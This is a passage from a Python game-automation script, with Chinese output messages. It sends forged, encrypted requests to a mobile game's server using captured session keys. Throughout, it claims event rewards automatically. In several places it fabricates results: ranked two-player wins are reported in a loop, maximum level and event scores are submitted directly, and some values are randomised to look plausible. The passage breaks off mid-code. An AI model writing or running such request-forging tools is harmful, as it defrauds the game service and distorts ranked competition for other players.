                            data = {"req": "V1053", "e": {"k": int(k1i)-1001, "pi": pi, "sk": sk, "t": "1", "ui": ui}, "ev": 3}
                            encrypted_data, head = get_encrypted_data(data, url)
                            response = _do_post(head, encrypted_data, data)
                            try:
                                response_data = json.loads(response.text)

                                if response_data.get("r") == 20013:
                                    print("当前请求文本已过期，需重新抓包")
                                elif response_data.get("r") == 0:
                                    print("奖励领取成功")
                                else:
                                    print("奖励领取失败")
                            except json.JSONDecodeError:
                                print("解析响应数据失败")
                            time.sleep(0)
                        for k2i in yue_list:
                            if not str(k2i).isdigit():
                                continue
                            data = {"req": "V1053", "e": {"k": int(k2i)-1001, "pi": pi, "sk": sk, "t": "3", "ui": ui}, "ev": 3}
                            encrypted_data, head = get_encrypted_data(data, url)
                            response = _do_post(head, encrypted_data, data)
                            response_data = json.loads(response.text)
                            if response_data.get("r") == 20013:
                                print("当前请求文本已过期，需重新抓包")
                            elif response_data.get("r") == 0:
                                print("奖励领取成功")
                            else:
                                print("奖励领取失败")
                            time.sleep(0)
                        for k3i in ge_list:
                            if not str(k3i).isdigit():
                                continue
                            data = {"req": "V1053", "e": {"k": int(k3i)-1001, "pi": pi, "sk": sk, "t": "4", "ui": ui}, "ev": 3}
                            encrypted_data, head = get_encrypted_data(data, url)
                            response = _do_post(head, encrypted_data, data)
                            response_data = json.loads(response.text)
                            if response_data.get("r") == 20013:
                                print("当前请求文本已过期，需重新抓包")
                            elif response_data.get("r") == 0:
                                print("奖励领取成功")
                            else:
                                print("奖励领取失败")
                            time.sleep(0)
                    elif int(item.get('id')) == 10833:
                        print("问卷调查活动开启")
                        data = {"req":"V956","e":{"pi": pi,"sk": sk,"ui": ui},"ev":3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        response_data = json.loads(response.text)
                        if response_data.get("r") == 20013:
                            print("当前请求文本已过期，需重新抓包")
                        elif response_data.get("r") == 0:
                            print("问卷领取成功")
                        else:
                            print("问卷领取失败")
                        time.sleep(0)
                    elif int(item.get('id')) == 10871:
                        print("培育计划活动开启")
                        nested_data_str = item['data']
                        nested_data = json.loads(nested_data_str)
                        i_value = []
                        for task in nested_data['task']:
                            if task['s'] == 0:
                                i_value.append(task['i'])
                        for id in i_value:
                            data = {"req": "V988", "e": {"pi": pi, "sk": sk, "t": "0", "task_id": id, "ui": ui}, "ev": 3}
                            encrypted_data, head = get_encrypted_data(data, url)
                            response = _do_post(head, encrypted_data, data)
                            response_data = json.loads(response.text)
                            if response_data.get("r") == 0:
                                print("奖励领取成功")
                            else:
                                print("奖励领取失败")
                        data = {"req": "V303", "e": {"al": [{"id": 10871, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "rv": "5", "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        decrypted_response = get_decrypted_data(url, data=response)
                        decrypted_json = json.loads(decrypted_response)
                        op_value = decrypted_json["e"]["d"][0].get("op")
                        if op_value == 0 or op_value == None:
                            print("活动未开启")
                        elif op_value == 1:
                            nested_data_str = decrypted_json['e']['d'][0]['data']
                            nested_data = json.loads(nested_data_str)
                            progress = nested_data['experience_value']
                            max_limit = nested_data['experience_value_max']
                            progress_info = f"当前进度({progress}/{max_limit})"
                            print(progress_info)
                            time.sleep(2)
                        data = {"req":"V989","e":{"pi":pi,"sk":sk,"ui":ui},"ev": 3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        response_data = json.loads(response.text)
                        if response_data.get("r") == 0:
                            print("奖励领取成功")
                    elif int(item.get('id')) == 10898:
                        print("红包活动开启")
                        data_str = item['data']
                        data_dict = json.loads(data_str)
                        task_list = []
                        for task in data_dict['taskList']:
                            if task['status'] == 0:
                                task_list.append(task['id'])
                        for id in task_list:
                            data ={"req": "V1122", "e": {"id": id, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
                            encrypted_data, head = get_encrypted_data(data, url)
                            response = _do_post(head, encrypted_data, data)
                            response_data = json.loads(response.text)
                            if response_data.get("r") == 0:
                                print("抽奖券领取成功")
                            else:
                                print("抽奖券领取失败")
                        activity_start_date = data_dict['st']
                        activity_end_date = data_dict['et']
                        current_date = datetime.now().strftime('%Y%m%d')
                        current_date_dt = datetime.now()
                        activity_start_dt = datetime.strptime(str(activity_start_date), '%Y%m%d')
                        activity_end_dt = datetime.strptime(str(activity_end_date), '%Y%m%d')
                        if current_date_dt < activity_start_dt:
                            print("未到活动时间（活动尚未开始）")
                        elif current_date_dt > activity_end_dt:
                            print("未到活动时间（活动已结束）")
                        else:
                            online_periods = data_dict['online']
                            current_hour = current_date_dt.hour
                            found_active_period = False
                            for period in online_periods:
                                period_start = period['st']
                                period_end = period['et']
                                status = period['status']
                                if period_start <= current_hour < period_end:
                                    found_active_period = True
                                    if status == 0:
                                        data = {"req":"V1120","e":{"pi":pi,"sk":sk,"type":"0","ui":ui},"ev": 3}
                                        encrypted_data, head = get_encrypted_data(data, url)
                                        response = _do_post(head, encrypted_data, data)
                                        response_data = json.loads(response.text)
                                        if response_data.get("r") == 20013:
                                            print("当前请求文本已过期，需重新抓包")
                                        elif response_data.get("r") == 0:
                                            print("领取成功")
                                            decrypted_response = get_decrypted_data(url, data=response)
                                            decrypted_json = json.loads(decrypted_response)
                                            i_value = str(decrypted_json['e']['d']['reward']['i'])
                                            q_value = decrypted_json['e']['d']['reward']['q']
                                            plant_info = formatted_plant.get(
                                                i_value,
                                                {"name": f"未知物品({i_value})", "pinzhi": "default"}
                                            )
                                            plant_name = plant_info["name"]
                                            plant_pinzhi = plant_info["pinzhi"]
                                            color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                                            print(f"获得的道具为: {color_code}{plant_name}{RESET_COLOR}")
                                            print(f"获得的数量为: {q_value}")
                                        else:
                                            print("领取失败")
                                    else:
                                        print(f"当前阶段已获取")
                                    break
                            if not found_active_period:
                                print("未到活动时间（当前不在活动时间段内）")
                    elif int(item.get('id')) == 10894:
                        print("超装活动开启")
                        for i in range(2):
                            data = {"req": "V1081", "e": {"pi": pi, "sk": sk, "t": i, "ui": ui}, "ev": 3}
                            encrypted_data, head = get_encrypted_data(data, url)
                            response = _do_post(head, encrypted_data, data)
                            response_data = json.loads(response.text)
                            if response_data.get("r") == 20013:
                                print("当前请求文本已过期，需重新抓包")
                            elif response_data.get("r") == 0:
                                print("奖励领取成功")
                        data = {"req": "V1080", "e": {"pi": pi, "sk": sk, "t": "1", "ui": ui}, "ev": 3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        response_data = json.loads(response.text)
                        if response_data.get("r") == 20013:
                            print("当前请求文本已过期，需重新抓包")
                        elif response_data.get("r") == 0:
                            print("奖励领取成功")
                            decrypted_response = get_decrypted_data(url, data=response)
                            decrypted_json = json.loads(decrypted_response)
                            gifts = decrypted_json['e']['d'].get('bl', [])
                            for gift in gifts:
                                i_value = str(gift.get('i', ""))
                                q_value = gift.get('q', 0)
                                plant_info = formatted_plant.get(
                                    i_value,
                                    {"name": f"未知物品({i_value})", "pinzhi": "default"}
                                )
                                plant_name = plant_info["name"]
                                plant_pinzhi = plant_info["pinzhi"]
                                color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                                print(f"获得的道具为: {color_code}{plant_name}{RESET_COLOR}")
                                print(f"获得的数量为: {q_value}")
                    elif int(item.get('id')) == 10907:
                        print("答题活动开启")
                        data = {"req":"V1290","e":{"pi":pi,"s":"5","sk":sk,"ui":ui},"ev":3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        response_data = json.loads(response.text)
                        if response_data.get("r") == 20013:
                            print("当前请求文本已过期，需重新抓包")
                        elif response_data.get("r") == 0:
                            print("答题成功")
                            data = {"req": "V303", "e": {"al": [{"id": 10907, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "rv": "5", "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
                            encrypted_data, head = get_encrypted_data(data, url)
                            response = _do_post(head, encrypted_data, data)
                            decrypted_response = get_decrypted_data(url, data=response)
                            decrypted_json = json.loads(decrypted_response)
                            inner_data = json.loads(decrypted_json["e"]["d"][0]["data"])
                            d_int = int(inner_data['d'])
                            rpn_value = int(inner_data['rpn'])
                            indices = []
                            for i, task in enumerate(inner_data['task_list']):
                                condition = task['condition']
                                is_receive = task['is_receive']
                                if condition <= d_int and is_receive == False:
                                    indices.append(i)
                            for id in indices:
                                data =  {"req":"V1292","e":{"id":id,"pi":pi,"sk":sk,"ui":ui},"ev":3}
                                encrypted_data, head = get_encrypted_data(data, url)
                                response = _do_post(head, encrypted_data, data)
                                response_data = json.loads(response.text)
                                if response_data.get("r") == 20013:
                                    print("当前请求文本已过期，需重新抓包")
                                elif response_data.get("r") == 0:
                                    print("累计答题奖励领取成功")
                                else:
                                    print("累计答题奖励领取失败")
                            for i in range(rpn_value):
                                data =  {"req":"V1291","e":{"pi":pi,"sk":sk,"ui":ui},"ev":3}
                                encrypted_data, head = get_encrypted_data(data, url)
                                response = _do_post(head, encrypted_data, data)
                                response_data = json.loads(response.text)
                                if response_data.get("r") == 20013:
                                    print("当前请求文本已过期，需重新抓包")
                                elif response_data.get("r") == 0:
                                    decrypted_response = get_decrypted_data(url, data=response)
                                    decrypted_json = json.loads(decrypted_response)
                                    i_value = str(decrypted_json['e']['d']['reward'][0]['i'])
                                    q_value = decrypted_json['e']['d']['reward'][0]['q']
                                    plant_info = formatted_plant.get(
                                        i_value,
                                        {"name": f"未知物品({i_value})", "pinzhi": "default"}
                                    )
                                    plant_name = plant_info["name"]
                                    plant_pinzhi = plant_info["pinzhi"]
                                    color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                                    print(f"获得的道具为: {color_code}{plant_name}{RESET_COLOR}×{q_value}")
                                else:
                                    print("福袋奖励领取失败")
                        elif response_data.get("r") == 76060:
                            print("今日已答题")
                        else:
                            print("答题失败")
                    elif int(item.get('id')) == 10863:
                        print("聚宝盘活动开启")
                        inner_data = json.loads(item["data"])
                        task = inner_data["task"]
                        keys_list = list(task.keys())
                        specific_keys = keys_list[:5]
                        extracted_numbers = [int(key) for key in specific_keys]
                        for ti in extracted_numbers:
                            data = {"req":"V868","e":{"pi":pi,"sk":sk,"ti":ti,"ui":ui},"ev":3}
                            encrypted_data, head = get_encrypted_data(data, url)
                            response = _do_post(head, encrypted_data, data)
                            response_data = json.loads(response.text)
                            if response_data.get("r") == 0:
                                print("聚宝盆任务领取成功")
                            else:
                                print("聚宝盆任务领取失败")
                        data = {"req":"V869","e":{"index":"3","pi":pi,"sk":sk,"t":"0","ui":ui},"ev":3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        response_data = json.loads(response.text)
                        if response_data.get("r") == 0:
                            print("代币领取成功")
                        else:
                            print("代币领取失败")
                    elif int(item.get('id')) == 10622:
                        d_item = item
                        nst_str = d_item['nst']
                        net_str = d_item['net']
                        data_dict = json.loads(d_item['data'])
                        t_str = data_dict['t']
                        task_bonus_list = data_dict['taskBonusList']
                        task_status_list = data_dict['taskStatusList']
                        nst_time = datetime.strptime(nst_str, "%Y%m%d%H%M%S")
                        net_time = datetime.strptime(net_str, "%Y%m%d%H%M%S")
                        t_time = datetime.strptime(t_str, "%Y-%m-%d %H:%M:%S")
                        tli_list = []
                        if nst_time < t_time < net_time:
                            tli_list = [item['tId'] for item in task_bonus_list]
                            tli_list = [tli_list[i] for i, status in enumerate(task_status_list) if status == 0]
                        for tk in tli_list:
                            data = {"req":"V1158","e":{"pi":pi,"sk":sk,"tk":tk,"ui":ui},"ev":3}
                            encrypted_data, head = get_encrypted_data(data, url)
                            response = _do_post(head, encrypted_data, data)
                            response_data = json.loads(response.text)
                            if response_data.get("r") == 20013:
                                print("当前请求文本已过期，需重新抓包")
                            elif response_data.get("r") == 0:
                                print("无尽每周奖励奖励领取成功")
                            else:
                                print("无尽每周奖励奖励领取失败")
                    elif int(item.get('id')) == 10803:
                        print("潘追指南活动开启")
                        score = int(json.loads(item['data'])['score'])
                        data_str = item['data']
                        data_dict = json.loads(data_str)
                        nb_list = data_dict['nb']
                        i_list = []
                        for index, item in enumerate(nb_list):
                            if item.get('s') == 0:
                                i_list.append(index)
                        botm_list = [int(key) for key in data_dict['botm'].keys()]
                        dt_list = data_dict['dt']
                        filtered_list = [item for item in botm_list if item not in dt_list]
                        ti_value = filtered_list[0] if filtered_list else None
                        if score < 300:
                            si = 300 - score
                            data = {"req":"V795","e":{"ai":"10803","g":"1","pi":pi,"s":si,"sk":sk,"ti":ti_value,"ui":ui},"ev":3}
                            encrypted_data, head = get_encrypted_data(data, url)
                            response = _do_post(head, encrypted_data, data)
                            response_data = json.loads(response.text)
                            if response_data.get("r") == 20013:
                                print("当前请求文本已过期，需重新抓包")
                            elif response_data.get("r") == 0:
                                print("潘追任务领取成功")
                            else:
                                print("潘追任务领取失败")
                        for i_value in i_list:
                            data ={"req":"V792","e":{"ai":"10803","i":i_value,"pi":pi,"sk":sk,"t":"1","ui":ui},"ev":3}
                            encrypted_data, head = get_encrypted_data(data, url)
                            response = _do_post(head, encrypted_data, data)
                            response_data = json.loads(response.text)
                            if response_data.get("r") == 20013:
                                print("当前请求文本已过期，需重新抓包")
                            elif response_data.get("r") == 0:
                                print("潘追奖励领取成功")
                            else:
                                print("潘追奖励领取失败")
                    elif int(item.get('id')) == 10836:
                        print("回忆之旅活动开启")
                        data_str = json.loads(item['data'])
                        gcl_list = []
                        bossReward_list = []
                        for idx, item in enumerate(data_str.get('gcl', [])):
                            if item != [1, 1, 1]:
                                gcl_list.append(idx)
                        for gi_1 in gcl_list:
                            data = {"req":"V971","e":{"gl":gi_1,"pi":pi,"r":"0","sk":sk,"tgt":"0,1,2","tp":"1","ui":ui,"wi":"1"},"ev":3}
                            encrypted_data, head = get_encrypted_data(data, url)
                            response = _do_post(head, encrypted_data, data)
                            response_data = json.loads(response.text)
                            if response_data.get("r") == 20013:
                                print("当前请求文本已过期，需重新抓包")
                            elif response_data.get("r") == 0:
                                print("回忆之旅简单模式成功")
                            else:
                                print("回忆之旅简单模式失败")
                        for idx, item in enumerate(data_str.get('bossReward', [])):
                            if item.get('own') == 0:
                                bossReward_list.append(idx)
                        for gi_2 in bossReward_list:
                            data = {"req": "V971", "e": {"gl": gi_2, "pi": pi, "r": "0", "sk": sk, "tgt": "0,1,2", "tp": "2", "ui": ui, "wi": "1"}, "ev": 3}
                            encrypted_data, head = get_encrypted_data(data, url)
                            response = _do_post(head, encrypted_data, data)
                            response_data = json.loads(response.text)
                            if response_data.get("r") == 20013:
                                print("当前请求文本已过期，需重新抓包")
                            elif response_data.get("r") == 0:
                                print("回忆之旅困难成功")
                            else:
                                print("回忆之旅困难失败")
                    elif int(item.get('id')) == 10859:
                        print("双人对决排位活动开启")
                        data_str = item['data']
                        data_dict = json.loads(data_str)
                        grade = data_dict['pf']['grade']
                        big = grade['big']
                        small = grade['small']
                        star = grade['star']
                        big_rank_mapping = {0: "铜锅", 1: "银锅", 2: "金锅", 3: "钻锅", 4: "大师锅", 5: "宗师锅"}
                        big_rank = big_rank_mapping[big]
                        small_rank_mapping = {0: "V", 1: "IV", 2: "III", 3: "II",4: "I"}
                        small_rank = small_rank_mapping[small]
                        star_count = star
                        result = 100 - big * 20 - small * 5 - star
                        for _ in range(result):
                            data ={"req": "V826", "e": {"bot": "1", "botTimes": "1", "pi": pi, "sk": sk, "ui": ui, "win": "1"}, "ev": 3}
                            encrypted_data, head = get_encrypted_data(data, url)
                            time.sleep(0.25)
                            response = _do_post(head, encrypted_data, data)
                            response_data = json.loads(response.text)
                            if response_data.get("r") == 20013:
                                print("当前请求文本已过期，需重新抓包")
                            elif response_data.get("r") == 0:
                                print("双人排位胜利")
                            else:
                                print("双人排位失败")
                                break
                    elif int(item.get('id')) == 10710:
                        print("大作战7天累计签到活动开启")
                        inner_data = json.loads(item["data"])
                        ld = int(inner_data['nds']['ld'])
                        if ld < 7:
                            data = {"req":"V350","e":{"ai":"10710","pi":pi,"sk":sk,"ui":ui},"ev":3}
                            encrypted_data, head = get_encrypted_data(data, url)
                            response = _do_post(head, encrypted_data, data)
                            response_data = json.loads(response.text)
                            if response_data.get("r") == 20013:
                                print("当前请求文本已过期，需重新抓包")
                            elif response_data.get("r") == 0:
                                print("7天累计签到成功")
                            else:
                                print("7天累计签到失败")
                    elif int(item.get('id')) == 10897:
                        print("15钻石宝箱活动开启")
                        data = {"req":"V1112","e":{"key":"0","pi":pi,"sk":sk,"ui":ui},"ev":3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        response_data = json.loads(response.text)
                        if response_data.get("r") == 20013:
                            print("当前请求文本已过期，需重新抓包")
                        elif response_data.get("r") == 0:
                            print("15钻石领取成功")
                        else:
                            print("15钻石领取失败")
                    elif int(item.get('id')) == 10861:
                        print("双人宝箱活动开启")
                        inner_data = json.loads(item["data"])
                        day_task_list = inner_data["day_task_list"]
                        ri_list = []
                        for key, value in day_task_list.items():
                            if value != 1:
                                ri_list.append(key)
                        for ti in ri_list:
                            data = {"req": "V857", "e": {"pi": pi, "sk": sk, "ti": ti, "type": "0", "ui": ui, "wi": "0"}, "ev": 3}
                            encrypted_data, head = get_encrypted_data(data, url)
                            response = _do_post(head, encrypted_data, data)
                            decrypted_response = get_decrypted_data(url, data=response)
                            decrypted_json = json.loads(decrypted_response)
                            r_value = decrypted_json.get('r', None)
                            if r_value != 0:
                                print("双人每日宝箱领取失败")
                            else:
                                print("双人每日宝箱领取成功")
                                gifts = decrypted_json['e']['d'].get('bl', [])
                                for gift in gifts:
                                    i_value = str(gift.get('i', ""))
                                    q_value = gift.get('q', 0)
                                    plant_info = formatted_plant.get(
                                        i_value,
                                        {"name": f"未知物品({i_value})", "pinzhi": "default"}
                                    )
                                    plant_name = plant_info["name"]
                                    plant_pinzhi = plant_info["pinzhi"]
                                    color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                                    print(f"获得的道具为: {color_code}{plant_name}{RESET_COLOR} × {q_value}")
                        data ={"req": "V1100", "e": {"pi": pi, "sk": sk, "ui": ui}, "ev": 3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        response_data = json.loads(response.text)
                        if response_data.get("r") == 20013:
                            print("当前请求文本已过期，需重新抓包")
                        elif response_data.get("r") == 0:
                            print("双人奖励领取成功")
                        else:
                            print("双人奖励领取失败")
                        time.sleep(0)
                    elif int(item.get('id')) == 10889:
                        print("幸运宝箱活动开启")
                        data_str = item['data']
                        data_dict = json.loads(data_str)
                        task_list_in_data = data_dict.get('task', [])
                        task_list = []
                        for task in task_list_in_data:
                            status = task.get('status')
                            task_id = task.get('taskId')
                            if status != 1:
                                task_list.append(task_id)
                        for ti in task_list:
                            data = {"req": "V507", "e": {"pi": pi, "sk": sk, "t": ti, "ui": ui}, "ev": 3}
                            encrypted_data, head = get_encrypted_data(data, url)
                            response = _do_post(head, encrypted_data, data)
                            decrypted_response = get_decrypted_data(url, data=response)
                            decrypted_json = json.loads(decrypted_response)
                            r_value = decrypted_json.get('r', None)
                            if r_value != 0:
                                print("幸运宝箱领取失败")
                            else:
                                print("幸运宝箱领取成功")
                                gifts = decrypted_json['e']['d']['gift']
                                gifts = gifts[0]
                                for gift in gifts:
                                    i_value = str(gift.get('i', ""))
                                    q_value = gift.get('q', 0)
                                    plant_info = formatted_plant.get(
                                        i_value,
                                        {"name": f"未知物品({i_value})", "pinzhi": "default"}
                                    )
                                    plant_name = plant_info["name"]
                                    plant_pinzhi = plant_info["pinzhi"]
                                    color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                                    print(f"获得的道具为: {color_code}{plant_name}{RESET_COLOR} × {q_value}")
                    elif int(item.get('id')) == 10896:
                        print("响叮当活动开启")
                        data = {"req":"V316","e":{"b":"0","n":"","pi":pi,"sk":sk,"ui":ui},"ev":3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        response_data = json.loads(response.text)
                        if response_data.get("r") == 20013:
                            print("当前请求文本已过期，需重新抓包")
                        elif response_data.get("r") == 0:
                            decrypted_response = get_decrypted_data(url, data=response)
                            decrypted_json = json.loads(decrypted_response)
                            zw_list = decrypted_json['e']['d'].get('pl', [])
                            for item in zw_list:
                                i_value = item['i']
                                s_value = item['s']
                                found = False
                                jieshu_value = None
                                for plant_dict in plant_list:
                                    plant_id = next(iter(plant_dict))
                                    if int(plant_id) == int(i_value):
                                        found = True
                                        jieshu_value = plant_dict.get('jieshu')
                                        break
                                if found:
                                    s_int = int(s_value)
                                    jieshu_int = int(jieshu_value)
                                    if s_int > jieshu_int:
                                        item['s'] = jieshu_value
                                    else:
                                        pass
                                else:
                                    print(f"植物编号 {i_value} 在 p_list 中未找到，跳过")
                            xdd_list = [111089, 111087, 111035, 111030, 111022, 111019, 1093, 1039, 1012, 1099, 200157]
                            rp_list = []
                            i_to_s = {}
                            for item in zw_list:
                                i_str = item.get('i')
                                s_str = item.get('s')
                                if i_str is None or s_str is None:
                                    continue
                                try:
                                    i_int = int(i_str)
                                    s_int = int(s_str)
                                    i_to_s[i_int] = s_int
                                except ValueError:
                                    continue
                            valid_xdd = []
                            for xdd_num in xdd_list:
                                if xdd_num in i_to_s:
                                    valid_xdd.append(xdd_num)
                            selected_xdd = random.sample(valid_xdd, min(8, len(valid_xdd)))
                            for xdd in selected_xdd:
                                s_value = i_to_s[xdd]
                                q_value = s_value + 1
                                rp_list.append({"i": xdd, "q": q_value})
                            data = {"req": "V303", "e": {"al": [{"id": 10896, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
                            encrypted_data, head = get_encrypted_data(data, url)
                            response = _do_post(head, encrypted_data, data)
                            response_data = json.loads(response.text)
                            if response_data.get("r") == 20013:
                                print("当前请求文本已过期，需重新抓包")
                            elif response_data.get("r") == 0:
                                decrypted_response = get_decrypted_data(url, data=response)
                                decrypted_json = json.loads(decrypted_response)
                                response_data = json.loads(response.text)
                                if response_data.get("r") == 0:
                                    op_value = decrypted_json["e"]["d"][0].get("op")
                                    if op_value == 0 or op_value == None:
                                        print("活动未开启")
                                    elif op_value == 1:
                                        data_str = json.loads(decrypted_json['e']['d'][0]['data'])
                                        all_are_two = True
                                        for item in data_str['ti']:
                                            if item.get('s') != 2:
                                                all_are_two = False
                                                break
                                        if all_are_two:
                                            print("响叮当任务已全部完成")
                                        else:
                                            max_limit = max(item['limit'] for item in data_str['ti'])
                                            value = math.ceil(max_limit / 10)
                                            top_value = "{0:.6f}".format(value)
                                            l_value = 0
                                            w_value = ""
                                            s_value = []
                                            s_values = 0
                                            r_value = ""
                                            hi_list = data_str['hi']
                                            for index, item in enumerate(hi_list):
                                                lecelInfo = item['lecelInfo']
                                                non_zero_count = sum([1 for sub_item in lecelInfo if sub_item['s'] != 0])
                                                if index == 0:
                                                    l_value = non_zero_count if non_zero_count <= 3 else l_value
                                                    if non_zero_count == 3 and index + 1 < len(hi_list):
                                                        next_lecelInfo = hi_list[index + 1]['lecelInfo']
                                                        next_non_zero_count = sum([1 for sub_item in next_lecelInfo if sub_item['s'] != 0])
                                                        if next_non_zero_count != 0 and next_non_zero_count <= 3:
                                                            l_value = next_non_zero_count
                                                            if next_non_zero_count == 3 and index + 2 < len(hi_list):
                                                                next_next_lecelInfo = hi_list[index + 2]['lecelInfo']
                                                                next_next_non_zero_count = sum([1 for sub_item in next_next_lecelInfo if sub_item['s'] != 0])
                                                                if next_next_non_zero_count != 0 and next_next_non_zero_count <= 3:
                                                                    l_value = next_next_non_zero_count
                                                s_value.extend([sub_item['s'] for sub_item in lecelInfo])
                                            s_values = [i for i in s_value[::-1] if i != 0]
                                            if s_values:
                                                s_values = s_values[0]
                                            random_number = random.randint(10000, 99999)
                                            r_value = str(random_number)
                                            non_zero_s_count = sum([1 for i in s_value if i != 0])
                                            if non_zero_s_count <= 3:
                                                w_value = hi_list[0]['name']
                                            elif 3 < non_zero_s_count <= 6:
                                                w_value = hi_list[1]['name']
                                            elif 6 < non_zero_s_count <= 9:
                                                w_value = hi_list[2]['name']
                                            for i in range(10):
                                                data = {"req":"V1094","e":{"p":i,"pi":pi,"r": r_value,"s":top_value,"sk":sk,"ui":ui},"ev": 3}
                                                encrypted_data, head = get_encrypted_data(data, url)
                                                response = _do_post(head, encrypted_data, data)
                                                try:
                                                    response_data = json.loads(response.text)
                                                    if response_data.get("r") == 0:
                                                        print("分数获取成功")
                                                    else:
                                                        print("分数获取失败")
                                                except json.JSONDecodeError:
                                                    print("解析响应数据失败")
                                                time.sleep(0.2)
                                            data = {"req": "V1091", "e": {"l": l_value, "pi": pi, "rp": rp_list, "s": max_limit, "sk": sk, "ui": ui, "w": w_value}, "ev": 3}
                                            encrypted_data, head = get_encrypted_data(data, url)
                                            response = _do_post(head, encrypted_data, data)
                                            response_data = json.loads(response.text)
                                            if response_data.get("r") == 0:
                                                print("关卡刷分成功")
                                                data = {"req": "V303", "e": {"al": [{"id": 10896, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
                                                encrypted_data, head = get_encrypted_data(data, url)
                                                response = _do_post(head, encrypted_data, data)
                                                decrypted_response = get_decrypted_data(url, data=response)
                                                decrypted_json = json.loads(decrypted_response)
                                                parsed_data = json.loads(decrypted_json['e']['d'][0]['data'])
                                                id_list = [item['id'] for item in parsed_data['ti'] if item['s'] == 1]
                                                for id_value in id_list:
                                                    data = {"req": "V1093", "e": {"id": id_value, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
                                                    encrypted_data, head = get_encrypted_data(data, url)
                                                    response = _do_post(head, encrypted_data, data)
                                                    try:
                                                        response_data = json.loads(response.text)
                                                        if response_data.get("r") == 0:
                                                            print("奖励领取成功")
                                                        else:
                                                            print("奖励领取失败")
                                                    except json.JSONDecodeError:
                                                        print("解析响应数据失败")
                                                    time.sleep(0.2)
                                            else:
                                                print("关卡刷分失败")
                                            time.sleep(0.2)
                        else:
                            print("存档获取失败")
                    elif int(item.get('id')) == 10903:
                        print("挂机清除活动开启")
                        nested_data_str = item['data']
                        nested_data = json.loads(nested_data_str)
                        l_value = nested_data['level']
                        task_list = nested_data['task']
                        max_value = task_list[-1]['limit']
                        data={"req": "V1190", "e": {"l": l_value, "pi": pi, "s": max_value, "sk": sk, "ui": ui}, "ev": 3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        response_data = json.loads(response.text)
                        if response_data.get("r") == 0:
                            print("刷分成功")
                        else:
                            print("刷分失败")
                        data = {"req": "V303", "e": {"al": [{"id": 10903, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "rv": "5", "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        decrypted_response = get_decrypted_data(url, data=response)
                        decrypted_json = json.loads(decrypted_response)
                        nested_data_str = decrypted_json['e']['d'][0]['data']
                        nested_data = json.loads(nested_data_str)
                        task_list = nested_data['task']
                        id_value = []
                        for task in task_list:
                            if task['s'] == 1:
                                id_value.append(task['id'])
                        for id in id_value:
                            data = {"req": "V1192", "e": {"pi": pi, "sk": sk, "ti": id, "ui": ui}, "ev": 3}
                            encrypted_data, head = get_encrypted_data(data, url)
                            response = _do_post(head, encrypted_data, data)
                            response_data = json.loads(response.text)
                            if response_data.get("r") == 0:
                                print("奖励领取成功")
                            else:
                                print("奖励领取失败")
                        data = {"req": "V1191", "e": {"pi": pi, "sk": sk, "ui": ui}, "ev": 3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        response_data = json.loads(response.text)
                        if response_data.get("r") == 0:
                            print("挂机奖励领取成功")

        try:
            run_eightieth_second_script()
        except Exception as e:
            print(f"回归有礼出错: {e}")

        choice = input("是否自动升阶植物和合成装扮？(回车自动执行，输入1跳过): ").strip()
        if choice == "":

            try:
                pi, ui, sk = session.pi, session.ui, session.sk
                is_ios_sj = (session.platform == "ios")
                sj_code = "V216" if is_ios_sj else "V316"

                def _find_pl(node):
                    stack = [node]
                    while stack:
                        current = stack.pop()
                        if isinstance(current, dict):
                            if "pl" in current:
                                return current.get("pl", [])
                            for v in current.values():
                                if isinstance(v, (dict, list)):
                                    stack.append(v)
                        elif isinstance(current, list):
                            for item in current:
                                if isinstance(item, (dict, list)):
                                    stack.append(item)
                    return []

                data = {"req": sj_code, "e": {"b": "0", "n": "", "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                decrypted_response = get_decrypted_data(url, data=response)
                decrypted_json = json.loads(decrypted_response)
                pl_before = {}
                for item in _find_pl(decrypted_json):
                    try:
                        pl_before[str(item['i'])] = int(item['s'])
                    except:
                        pass

                run_fortieth_fourth_script()

                data = {"req": sj_code, "e": {"b": "0", "n": "", "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
